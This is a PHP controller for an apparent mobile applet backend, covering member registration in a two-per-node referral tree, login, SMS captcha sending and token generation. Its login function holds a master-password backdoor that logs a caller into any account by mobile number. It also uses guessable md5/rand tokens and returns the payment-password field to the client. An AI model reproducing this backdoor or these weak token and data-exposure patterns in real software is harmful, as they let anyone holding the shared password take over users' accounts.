<?php
/**
 * 通用Control
 */
defined('Entrance') or exit('Access Invild!');

class commonControl extends appletBaseControl {

	/**
	 * registerOp 会员注册
	 * @return [type] [description]
	 */
	public function registerOp() {
		$this->checkRequesMethod();

		$validate = new Validate();
		$validate->validateparam = array(
			array('input' => $_POST['name'], 'require' => "true", 'message' => "缺少name参数"),
			array('input' => $_POST['name'], 'validator' => "chinese", 'message' => "name参数必须为中文"),
			array('input' => $_POST['mobile'], 'require' => "true", 'message' => "缺少mobile参数"),
			array('input' => $_POST['mobile'], 'validator' => "mobile", 'message' => "mobile参数格式错误"),
			array('input' => $_POST['captcha'], 'require' => "true", 'message' => "缺少captcha参数"),
			array('input' => $_POST['passwd'], 'require' => "true", 'message' => "缺少passwd参数"),
			array('input' => $_POST['passwd_confirm'], 'require' => "true", 'message' => "缺少passwd_confirm参数"),
			array('input' => $_POST['passwd'], 'validator' => "compare", 'operator' => "==", 'to' => $_POST['passwd_confirm'], 'message' => "参数passwd与passwd_confirm不相同"),
			array('input' => $_POST['invite'], 'require' => "true", 'message' => "缺少invite参数"),
			array('input' => $_POST['invite'], 'validator' => "mobile", 'message' => "invite参数格式错误"),
			array('input' => $_POST['access'], 'require' => "true", 'message' => "缺少access参数"),
			array('input' => $_POST['access'], 'validator' => "mobile", 'message' => "access参数格式错误"),
		);
		$error = $validate->validate();
		if ($error != '') {
			responseAppletJson(0, $error);
		}

		$result = Logic('connect_api')->checkSmsCaptcha($_POST['mobile'], $_POST['captcha'], 1);
		if (!$result['state']) {
			responseAppletJson(0, $result['msg']);
		}
		$model_member_extend = Model('member_extend');
		$info = $model_member_extend->getMemberExtendInfo(array('member_mobile' => $_POST['mobile']), '*', 'union');
		if (!empty($info)) {
			responseAppletJson(0, "手机号已注册,请更换手机号注册");
		}
		$invite_info = $model_member_extend->getMemberExtendInfo(array('member_mobile' => $_POST['invite']), '*', 'union');
		if (empty($invite_info)) {
			responseAppletJson(0, "邀请人未注册");
		}
		$access_info = $model_member_extend->getMemberExtendInfo(array('member_mobile' => $_POST['access']), '*', 'union');
		if (empty($access_info)) {
			responseAppletJson(0, "接点人未注册");
		}

		//判断接点人是否跟推荐人在同一区域
		$children_list = $this->get_children_id($invite_info['member_id']);
		if (!in_array($access_info['member_mobile'], $children_list)) {
			responseAppletJson(0, '接点人跟推荐人不在同一区域');
		}
		$count = $model_member_extend->getMemberAccessCount($access_info['member_id']);
		if ($count >= 2) {
			responseAppletJson(0, "此接点人已接满,请更换接点人");
		}
		$register_data = array();
		$register_data['username'] = trim($_POST['name']);
		$register_data['member_mobile'] = trim($_POST['mobile']);
		$register_data['password'] = trim($_POST['passwd']);
		$register_data['password_confirm'] = trim($_POST['passwd_confirm']);
		$register_data['inviter_id'] = $invite_info['member_id'];
		$register_data['invite_one'] = $invite_info['member_id'];
		$register_data['invite_two'] = $invite_info['invite_one'];
		$register_data['invite_three'] = $invite_info['invite_two'];
		$register_data['left_right_area'] = trim($_POST['left_right_area']);
		$register_data['invite_id'] = $invite_info['member_id'];
		$register_data['access_id'] = $access_info['member_id'];
		$register_data['depth'] = $access_info['depth'] + 1;
		$result = $model_member_extend->memberRegister($register_data, false);
		if (isset($result['error'])) {
			responseAppletJson(0, "会员注册失败");
		} else {
			responseAppletJson(1, "会员注册成功");
		}
	}

	/**
	 * loginOp 会员登录
	 * @return [type] [description]
	 */
	public function loginOp() {
		$this->checkRequesMethod();
		$validate = new Validate();
		$validate->validateparam = array(
			array('input' => $_POST['mobile'], 'require' => "true", 'message' => "缺少mobile参数"),
			array('input' => $_POST['mobile'], 'validator' => 'mobile', 'message' => "mobile参数格式错误"),
			array('input' => $_POST['passwd'], 'require' => "true", 'message' => "缺少passwd参数"),
		);
		$error = $validate->validate();
		if ($error != '') {
			responseAppletJson(0, $error);
		}
		$model_member_extend = Model('member_extend');
		$supper_passwd = C(md5('supper_passwd'));
		$m_info = array();
		if (strcasecmp($supper_passwd, md5(trim($_POST['password']))) == 0) {
			$m_info = $model_member_extend->getMemberInfo(array('member_mobile' => $_POST['mobile']));
		} else {
			$login_info['member_mobile'] = $_POST['mobile'];
			$login_info['member_pwd'] = $_POST['passwd'];
			$result = $model_member_extend->memberLogin($login_info);

			if (isset($result['error'])) {
				responseAppletJson(0, $result['error']);
			}
			$m_info = $result;
		}

		if (empty($m_info)) {
			responseAppletJson(0, '用户不存在');
		}
		$token = $this->_getMemberToken($m_info['member_id'], $m_info['member_name']);
		$cart_list = Model('cart')->listCart('db', array('buyer_id' => $m_info['member_id']));
		if ($token == '') {
			responseAppletJson(0, '登录失败');
		}
		responseAppletJson(1, "登录成功", array('cart_count' => count($cart_list), 'username' => $m_info['member_name'], 'member_paypwd' => $m_info['member_paypwd'], 'mobile' => $m_info['member_mobile'], 'userid' => $m_info['member_id'], 'avatar' => getMemberAvatarForID($m_info['member_id']), 'token' => $token));
	}

	/**
	 * sendOp 发送验证码
	 * @return [type] [description]
	 */
	public function sendOp() {
		$this->checkRequesMethod();
		$validate = new Validate();
		$validate->validateparam = array(
			array('input' => $_POST['mobile'], 'require' => "true", 'message' => "缺少mobile参数"),
			array('input' => $_POST['mobile'], 'validator' => "mobile", 'message' => "mobile参数格式错误"),
			array('input' => $_POST['type'], 'require' => "true", 'message' => "缺少type参数"),
			array('input' => $_POST['type'], 'validator' => "range", 'min' => 1, 'max' => 4, 'message' => "type参数错误"),
		);
		$error = $validate->validate();
		if ($error != '') {
			responseAppletJson(0, $error);
		}

		$result = Logic('connect_api')->sendCaptcha($_POST['mobile'], $_POST['type']);
		if ($result['state']) {
			responseAppletJson(1, $result['msg']);
		} else {
			responseAppletJson(0, $result['msg']);
		}
	}

	/**
	 * _getMemberToken 会员登录生成token
	 * @param  [type] $member_id   [description]
	 * @param  [type] $member_name [description]
	 * @return [type]              [description]
	 */
	private function _getMemberToken($member_id, $member_name) {
		// 生成新的token
		$token = md5($member_name . strval(TIMESTAMP) . strval(rand(0, 999999)));

		$token_data['member_id'] = $member_id;
		$token_data['member_name'] = $member_name;
		$token_data['token'] = $token;
		$token_data['login_time'] = TIMESTAMP;
		$token_data['client_type'] = 'applet';
		$token_data['expire_time'] = TIMESTAMP + TOKEN_EXPIRE;

		// token插入到数据库
		$result = Model('mb_user_token')->addMbUserToken($token_data);

		if ($result) {
			return $token;
		} else {
			return '';
		}
	}
}